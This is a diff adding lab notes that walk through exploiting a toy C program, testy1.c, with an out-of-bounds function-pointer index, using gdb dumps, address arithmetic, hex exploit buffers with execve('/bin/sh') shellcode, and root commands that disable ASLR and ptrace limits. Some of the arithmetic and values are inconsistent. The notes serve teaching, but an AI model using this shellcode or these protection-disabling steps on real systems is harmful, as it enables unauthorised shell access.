@@ -833,3 +833,570 @@ be swizzled.
 
 testy1.c notes
 
+This is code I had for a class.  The assignment was to simply 
+invoke the secret function.  Here is a method for getting a shell.
+Since this code uses a function pointer its easier to exploit
+than our target example.  We will use it to show a few things
+before we resume working with that program.
+
+dbit.sh and runbin.sh are used with testy1.c.  Edit the .gdbinit file to change
+options for use with this program as well.
+
+I was having problems attaching to the process in my vm.  It appears newer 
+kernels/distros do not permit gdb attachment to process's. Do this to enable 
+attachment:
+
+As root:
+echo 0 > /proc/sys/kernel/yama/ptrace_scope
+…or make it permanent by setting ptrace_scope to 0 in /etc/sysctl.d/10-ptrace.conf
+
+ASIDE:
+I was using this to see if I had the wrong pid.
+pstree -l -s -p somepid#
+
+List breakpoints in gdb using 
+(gdb) info break
+
+Clear breakpoint with
+(gdb) clear <bp line number>
+Without a number it clears the bp on the current line.
+
+This was the exploit buffer used for the class assignment.  I'm reusing it as a starting point.
+However, this line will not work on this system.  Its a newer kernel, gcc, glibc, etc.
+Not a problem though.
+
+Here is the buffer entered at the selection prompt for select>
+
+771675175\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf1\xff\xbf\x00\x00\x00\x00\xbb\x40\xf1\xff\xbf\xb9\x48\xf1\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf1\xff\xbf
+
+set break after read at line 107 or step using next.
+
+
+Since the code is run inside a script it will interpe the  slash commands as hex codes.
+This code uses read() so it will read nulls.  The first number is an index into a pointer array
+which it will call.  ie. if you submit 1, it will call function 1 in the array.  So, we are submitting
+an index which is way the fsck out of bounds.  How did this number get calculated?
+
+Look at the stack pointer, (which is the same as buf since its the first specified local variable)
+(gdb) x/x $esp
+0xbfbe13e0:     0x36313737
+
+Look at the function pointer.
+(gdb) x/x ptrs
+0x80ec480 <ptrs>:       0x00000000
+(gdb) print ptrs
+$2 =   {[0] = 0x0,
+  [1] = 0x80488ee <get_wisdom at testy1.c:41>,
+  [2] = 0x804898e <put_wisdom at testy1.c:56>}
+(gdb) 
+
+Some math:
+esp     0xbfbe 13e0
+ptrs  - 0x080e c480
+-------------------
+        0xb7af 4f60
+
+ptrs is a 4 byte pointer. It points to function addresses which are words. So, divide by 4
+or shift right twice.
+
+
+        0xb7af 4f60
+  div by          4
+-------------------
+        0x2deb d3d8
+
+Convert to decimal
+770,429,912
+
+This will cause a function to invoked at the top of the stack.  However, our code is not 
+at the top of the stack its a little bit further down. ie. buf is a stack variable which is
+at the top of the stack, but the shell code is not at the start of the buf.  The index to the 
+function pointer is the first few bytes.
+
+<do this one over>
+(gdb) x/4x buf
+0xbfbe13e0:     0x36313737      0x37313537      0x00000035      0x41414141
+(gdb) x/4x $esp
+0xbfbe13e0:     0x36313737      0x37313537      0x00000035      0x41414141
+
+
+
+Look at the portions of buf we supplied.
+<do this one over>
+
+(gdb) x/20xw buf
+0xbfbe13e0:     0x36313737      0x37313537      0x00000035      0x41414141
+0xbfbe13f0:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbfbe1400:     0xfff140bb      0xf148b9bf      0x00babfff      0xb8000000
+0xbfbe1410:     0x0000000b      0x414180cd      0x41414141      0x41414141
+0xbfbe1420:     0xbffff150      0x0000000a      0x00000000      0x00000000
+(gdb) 
+
+We supplied some A's at two points.  Towards the start and near the end.
+
+(gdb) x/20s buf
+0xbfbe13e0:     "771675175"   <-- this index is not 770,429,912
+0xbfbe13ea:     ""
+0xbfbe13eb:     ""
+0xbfbe13ec:     "AAAA/bin/sh"
+0xbfbe13f8:     "@\361\377\277"
+0xbfbe13fd:     ""
+0xbfbe13fe:     ""
+0xbfbe13ff:     ""
+0xbfbe1400:     "\273@\361\377\277\271H\361\377\277\272"  <-- its supposed to be here
+0xbfbe140c:     ""                                            see below for more info
+0xbfbe140d:     ""
+0xbfbe140e:     ""
+0xbfbe140f:     "\270\v"
+0xbfbe13ff:     ""
+0xbfbe1400:     "\273@\361\377\277\271H\361\377\277\272"
+0xbfbe140c:     ""
+0xbfbe140d:     ""
+0xbfbe140e:     ""
+0xbfbe140f:     "\270\v"
+0xbfbe1412:     ""
+0xbfbe1413:     ""
+0xbfbe1414:     "̀AAAAAAAAAAP\361\377\277\n"
+0xbfbe1426:     ""
+0xbfbe1427:     ""
+0xbfbe1428:     ""
+0xbfbe1429:     ""
+
+
+Using those as markers, lets disass some code.
+
+ASIDE:
+disas in gdb works a little weird for raw addresses.
+(gdb) disas foo
+will disas the function foo
+
+(gdb) disas 0x1234
+will give an error because it thinks the address is a function which does not exist.
+Instead use a comma and give a count of how many bytes to disassemble.
+(Well this is not entirely accurate.  On some gdb versions it uses a comma and others
+it does not.  The ones which do not use a comma do not take a count.  They require
+an absolute ending address. :-/ Depending upon your version you do either of these forms.
+
+(gdb) disas 0xbfbe1400, +30
+or
+(gdb) disas 0xbfbe1400 0xbfbe1410
+
+Also, try using with a /r syntax so it will give opcodes.
+(gdb) disas 0xbfbe1400, +22
+Dump of assembler code from 0xbfbe1400 to 0xbfbe1416:
+   0xbfbe1400:  mov    $0xbffff140,%ebx
+   0xbfbe1405:  mov    $0xbffff148,%ecx
+   0xbfbe140a:  mov    $0x0,%edx
+   0xbfbe140f:  mov    $0xb,%eax
+   0xbfbe1414:  int    $0x80
+End of assembler dump.
+
+(gdb) disas /r 0xbfbe1400, +22
+Dump of assembler code from 0xbfbe1400 to 0xbfbe1416:
+   0xbfbe1400:  bb 40 f1 ff bf  mov    $0xbffff140,%ebx
+   0xbfbe1405:  b9 48 f1 ff bf  mov    $0xbffff148,%ecx
+   0xbfbe140a:  ba 00 00 00 00  mov    $0x0,%edx
+   0xbfbe140f:  b8 0b 00 00 00  mov    $0xb,%eax
+   0xbfbe1414:  cd 80   int    $0x80
+End of assembler dump.
+(gdb) 
+
+
+Above is the code we want to execute.  I'll explain that in a bit.  Let's fix up the address
+jump addresses first.
+
+
+Some math:
+start of code     0xbfbe 1400
+ptrs            - 0x080e c480
+-----------------------------
+                  0xb7af 4f80
+
+ptrs is a 4 byte pointer. It points to function addresses which are words. So, divide by 4
+or shift right twice.
+
+
+        0xb7af 4f80
+  div by          4
+-------------------
+        0x2deb d3e0
+
+Convert to decimal
+770,429,920
+
+So our new exploit buffer is
+
+770429920\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf1\xff\xbf\x00\x00\x00\x00\xbb\x40\xf1\xff\xbf\xb9\x48\xf1\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf1\xff\xbf
+
+
+Gott verdammt.  I forgot to turn off ASLR.  I did a restart and look at what it did.
+
+(gdb) x/16xw buf
+0xbff905e0:     0x34303737      0x32393932      0x00000030      0x41414141
+0xbff905f0:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbff90600:     0xfff140bb      0xf148b9bf      0x00babfff      0xb8000000
+0xbff90610:     0x0000000b      0x414180cd      0x41414141      0x41414141
+(gdb) quit
+A debugging session is active.
+
+
+ok. Here is your quick look at ASLR. 
+
+# cat /proc/sys/kernel/randomize_va_space
+
+0 – Radomization is off.
+1 – Patial radomization. Shared libraries, stack, mmap(), VDSO and heap are randomized.
+2 – Full randomization. Same as above but changing end of data segment with brk() and sbrk() is
+also randomized.
+
+Turn it off at runtime.
+# echo 0 > /proc/sys/kernel/randomize_va_space
+
+Turn it off at boot.
+# cat /etc/sysctl.d/01-disable-aslr.conf 
+kernel.randomize_va_space = 0
+
+Ok. One more time.
+In one terminal, ./runbin.sh to start the program with the looper to interpet hex escape codes.
+In another terminal, ./gdbit.sh to attach gdb.  Type cont to continue and then back to the first 
+terminal to paste in the exploit text.  Switch back to the debugger and we resume.
+
+
+
+(gdb) x/16xw buf
+0xbfbe7f10:     0x34303737      0x32393932      0x00000030      0x41414141
+0xbfbe7f20:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbfbe7f30:     0xfff140bb      0xf148b9bf      0x00babfff      0xb8000000
+0xbfbe7f40:     0x0000000b      0x414180cd      0x41414141      0x41414141
+
+(gdb) x/10s buf
+0xbfbe7f10:     "770429920"
+0xbfbe7f1a:     ""
+0xbfbe7f1b:     ""
+0xbfbe7f1c:     "AAAA/bin/sh"
+0xbfbe7f28:     "@\361\377\277"
+0xbfbe7f2d:     ""
+0xbfbe7f2e:     ""
+0xbfbe7f2f:     ""
+0xbfbe7f30:     "\273@\361\377\277\271H\361\377\277\272"
+0xbfbe7f3c:     ""
+
+(gdb) disas 0xbfbe7f30, +22
+Dump of assembler code from 0xbfbe7f30 to 0xbfbe7f46:
+   0xbfbe7f30:  mov    $0xbffff140,%ebx
+   0xbfbe7f35:  mov    $0xbffff148,%ecx
+   0xbfbe7f3a:  mov    $0x0,%edx
+   0xbfbe7f3f:  mov    $0xb,%eax
+   0xbfbe7f44:  int    $0x80
+End of assembler dump.
+(gdb) 
+
+(gdb) x/10wx ptrs
+0x80ec660 <ptrs>:       0x00000000      0x080488ee      0x0804898e      0x00000d00
+0x80ec670 <_nl_current_default_domain>: 0x080bca20      0x080ed8a0      0x00000000      0x00000000
+0x80ec680 <_IO_list_all>:       0x080ec6a0      0x00000000
+
+
+Same process as before
+
+Some math:
+start of code     0xbfbe 7f30
+ptrs            - 0x080e c660
+-----------------------------
+                  0xb7af 68d0
+
+ptrs is a 4 byte pointer. It points to function addresses which are words. So, divide by 4
+or shift right twice.
+
+
+        0xb7af 68d0
+  div by          4
+-------------------
+        0x2deb ee34
+
+Convert to decimal
+770,436,660
+
+So our new exploit buffer is
+
+770436660\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf1\xff\xbf\x00\x00\x00\x00\xbb\x40\xf1\xff\xbf\xb9\x48\xf1\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf1\xff\xbf
+
+
+Restart, lets see this time we should be able to step to the function pointer.  The code which we step
+to will still be wrong, but one step at a time.
+
+ach du lieber gott
+It did it again.  And 
+[root@vm-i386 ~]# cat /etc/sysctl.d/01-disable-aslr.conf
+kernel.randomize_va_space = 0
+
+is back.
+
+So here is the fix.  Archlinux uses sysctl
+
+Show your current settings.
+
+# sysctn -a | grep randomize
+kernel.randomize_va_space = 2
+
+Try turning it off and look again at sysctl settings.
+[root@vm-i386 ~]# cat /proc/sys/kernel/randomize_va_space 
+2
+[root@vm-i386 ~]# echo 0 >  /proc/sys/kernel/randomize_va_space 
+[root@vm-i386 ~]# cat /proc/sys/kernel/randomize_va_space 
+0
+[root@vm-i386 ~]# sysctl -a | grep randomize
+kernel.randomize_va_space = 0
+sysctl: reading key "net.ipv6.conf.all.stable_secret"
+sysctl: reading key "net.ipv6.conf.default.stable_secret"
+sysctl: reading key "net.ipv6.conf.ens3.stable_secret"
+sysctl: reading key "net.ipv6.conf.lo.stable_secret"
+[root@vm-i386 ~]# 
+
+Hmm, its not in here:
+cat /usr/lib/sysctl.d/50-default.conf | grep randomize
+
+Nor here:
+cat /lib/sysctl.d/50-default.conf  | grep randomize
+
+And then to stick changes, make sure it shows the config files being called
+use sysctl --system
+
+Once again here I set them to non hacking friendly, restart the sysctl with
+the config files and then see that the values are back to friendly.
+
+[root@vm-i386 ~]# echo 1 > /proc/sys/kernel/yama/ptrace_scope 
+[root@vm-i386 ~]# echo 1 > /proc/sys/kernel/randomize_va_space 
+[root@vm-i386 ~]# sysctl --system
+* Applying /etc/sysctl.d/01-disable-aslr.conf ...
+kernel.randomize_va_space = 0
+* Applying /etc/sysctl.d/10-ptrace.conf ...
+kernel.yama.ptrace_scope = 0
+* Applying /usr/lib/sysctl.d/50-coredump.conf ...
+kernel.core_pattern = |/usr/lib/systemd/systemd-coredump %P %u %g %s %t %e
+* Applying /usr/lib/sysctl.d/50-default.conf ...
+kernel.sysrq = 16
+kernel.core_uses_pid = 1
+net.ipv4.conf.default.rp_filter = 1
+net.ipv4.conf.all.rp_filter = 1
+net.ipv4.conf.default.accept_source_route = 0
+net.ipv4.conf.all.accept_source_route = 0
+net.ipv4.conf.default.promote_secondaries = 1
+net.ipv4.conf.all.promote_secondaries = 1
+net.core.default_qdisc = fq_codel
+fs.protected_hardlinks = 1
+fs.protected_symlinks = 1
+[root@vm-i386 ~]# cat /proc/sys/kernel/yama/ptrace_scope 
+0
+[root@vm-i386 ~]# cat /proc/sys/kernel/randomize_va_space 
+0
+
+And finally for completion sake:
+
+[root@vm-i386 ~]# cat /etc/sysctl.d/10-ptrace.conf 
+kernel.yama.ptrace_scope=0
+[root@vm-i386 ~]# cat /etc/sysctl.d/01-disable-aslr.conf 
+kernel.randomize_va_space = 0
+
+
+Ok, one more time
+
+(gdb) x/16xw buf
+0xbffff330:     0x34303737      0x36363633      0x00000030      0x41414141
+0xbffff340:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbffff350:     0xfff140bb      0xf148b9bf      0x00babfff      0xb8000000
+0xbffff360:     0x0000000b      0x414180cd      0x41414141      0x41414141
+
+(gdb) x/10s buf
+0xbffff330:     "770436660"
+0xbffff33a:     ""
+0xbffff33b:     ""
+0xbffff33c:     "AAAA/bin/sh"
+0xbffff348:     "@\361\377\277"
+0xbffff34d:     ""
+0xbffff34e:     ""
+0xbffff34f:     ""
+0xbffff350:     "\273@\361\377\277\271H\361\377\277\272"
+0xbffff35c:     ""
+(gdb) 
+
+(gdb) disas 0xbffff350, +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  mov    $0xbffff140,%ebx
+   0xbffff355:  mov    $0xbffff148,%ecx
+   0xbffff35a:  mov    $0x0,%edx
+   0xbffff35f:  mov    $0xb,%eax
+   0xbffff364:  int    $0x80
+End of assembler dump.
+(gdb) 
+
+(gdb) x/10wx ptrs
+0x80ec660 <ptrs>:       0x00000000      0x080488ee      0x0804898e      0x00000d00
+0x80ec670 <_nl_current_default_domain>: 0x080bca20      0x080ed8a0      0x00000000      0x00000000
+0x80ec680 <_IO_list_all>:       0x080ec6a0      0x00000000
+(gdb) 
+
+
+
+Some math:
+start of code     0xbfff f350
+ptrs            - 0x080e c660
+-----------------------------
+                  0xb7f1 2cf0
+
+ptrs is a 4 byte pointer. It points to function addresses which are words. So, divide by 4
+or shift right twice.
+
+
+        0xb7f1 c660
+  div by          4
+-------------------
+        0x2dfc 4b3c
+
+Convert to decimal
+771,509,052
+
+So our new exploit buffer is
+
+
+
+771509052\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf1\xff\xbf\x00\x00\x00\x00\xbb\x40\xf1\xff\xbf\xb9\x48\xf1\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf1\xff\xbf
+
+Ok Good.  The function pointer is setup to call a routine at 0xbffff350
+which is the first instruction of our shell code.
+(gdb) print ptrs[s]
+$4 = (fptr) 0xfff140bb
+
+and
+
+(gdb) x/16xw buf
+0xbffff330:     0x35313737      0x35303930      0x00000032      0x41414141
+0xbffff340:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbffff350:     0xfff140bb      0xf148b9bf      0x00babfff      0xb8000000
+
+Rewrite this instruction to be something else for grins.
+
+(gdb) set var ptrs[s] = main
+(gdb) print ptrs[s] 
+$5 = (fptr) 0x8048a7c <main at testy1.c:96>
+(gdb) x/16xw buf   
+0xbffff330:     0x35313737      0x35303930      0x00000032      0x41414141
+0xbffff340:     0x6e69622f      0x0068732f      0xbffff140      0x00000000
+0xbffff350:     0x08048a7c      0xf148b9bf      0x00babfff      0xb8000000
+0xbffff360:     0x0000000b      0x414180cd      0x41414141      0x41414141
+
+How to do a system call on linux.  
+$man syscall 
+$man execve
+Here are the important parts for us.
+
+       arch/ABI   instruction          syscall #   retval Notes
+       ───────────────────────────────────────────────────────────────────
+       i386       int $0x80            eax         eax
+
+
+      The second table shows the registers used to pass the system call argu‐
+       ments.
+
+       arch/ABI      arg1  arg2  arg3  arg4  arg5  arg6  arg7  Notes
+       ──────────────────────────────────────────────────────────────────
+       i386          ebx   ecx   edx   esi   edi   ebp   -
+
+
+      int execve(const char *path, char *const argv[], char *const envp[]);
+
+and for the syscall number for exec
+
+[davis@vm-i386 proc]$ grep exec /usr/include/asm/unistd_32.h 
+#define __NR_execve 11 
+which is 0xb
+
+So, to do the execve we need
+
+eax = syscall number, 0x3b for execve
+ebx = path, "/bin/sh"
+ecx = argv, which is a pointer to our path
+edx = null
+
+Ok, on our setup "/bin/sh" is not at address 0xbffff140.  Its at 0xbffff340
+(gdb) x/4s 0xbffff340
+0xbffff340:     "/bin/sh"
+0xbffff348:     "@\361\377\277"
+
+
+
+Breaking this into managble pieces
+771509052\x00 our function pointer index
+
+\x00\x00AAAA  our space for byte alignment and marker
+
+
+\x2f\x62\x69\x6e\x2f\x73\x68\x00  our "\bin\sh"
+
+
+\x40\xf1\xff\xbf\x00  our pointer to address above.  This needs to be 40f3 instead of 40f1
+
+
+\x00\x00\x00
+
+\xbb\x40\xf1\xff\xbf our first move instruction to load ebx
+
+\xb9\x48\xf1\xff\xbf our second move instruction to load ecx
+
+\xba\x00\x00\x00\x00 our third move instruction to load edx
+
+
+\xb8\x0b\x00\x00\x00 our fourth move instruction to load eax with syscall number 11 for execve
+
+
+\xcd\x80 our int80 to do syscall.
+
+
+AAAAAAAAAA  marker
+
+
+\x50\xf1\xff\xbf our 
+
+
+771509060\x00\x00\x00AAAA\x2f\x62\x69\x6e\x2f\x73\x68\x00\x40\xf3\xff\xbf\x00\x00\x00\x00\xbb\x40\xf3\xff\xbf\xb9\x48\xf3\xff\xbf\xba\x00\x00\x00\x00\xb8\x0b\x00\x00\x00\xcd\x80AAAAAAAAAA\x50\xf3\xff\xbf
+
+
+Our final result after fixes is:
+(gdb) disas /r 0xbffff350, +22
+Dump of assembler code from 0xbffff350 to 0xbffff366:
+   0xbffff350:  bb 40 f3 ff bf  mov    $0xbffff340,%ebx
+   0xbffff355:  b9 48 f3 ff bf  mov    $0xbffff348,%ecx
+   0xbffff35a:  ba 00 00 00 00  mov    $0x0,%edx
+   0xbffff35f:  b8 0b 00 00 00  mov    $0xb,%eax
+   0xbffff364:  cd 80   int    $0x80
+End of assembler dump.
+
+
+
+(gdb) x/10s buf
+0xbffff330:     "771509052"
+0xbffff33a:     ""
+0xbffff33b:     ""
+0xbffff33c:     "AAAA/bin/sh"
+0xbffff348:     "@\363\377\277"
+0xbffff34d:     ""
+0xbffff34e:     ""
+0xbffff34f:     ""
+0xbffff350:     "\273@\363\377\277\271H\363\377\277\272"
+0xbffff35c:     ""
+
+
+(gdb) x/80x buf
+0xbffff330:     0x37    0x37    0x31    0x35    0x30    0x39    0x30    0x35
+0xbffff338:     0x32    0x00    0x00    0x00    0x41    0x41    0x41    0x41
+0xbffff340:     0x2f    0x62    0x69    0x6e    0x2f    0x73    0x68    0x00
+0xbffff348:     0x40    0xf3    0xff    0xbf    0x00    0x00    0x00    0x00
+0xbffff350:     0xbb    0x40    0xf3    0xff    0xbf    0xb9    0x48    0xf3
+0xbffff358:     0xff    0xbf    0xba    0x00    0x00    0x00    0x00    0xb8
+0xbffff360:     0x0b    0x00    0x00    0x00    0xcd    0x80    0x41    0x41
+0xbffff368:     0x41    0x41    0x41    0x41    0x41    0x41    0x41    0x41
+0xbffff370:     0x50    0xf1    0xff    0xbf    0x0a    0x00    0x00    0x00
+0xbffff378:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
+
+If it helps, print out this byte dump and circle the various pieces.
+
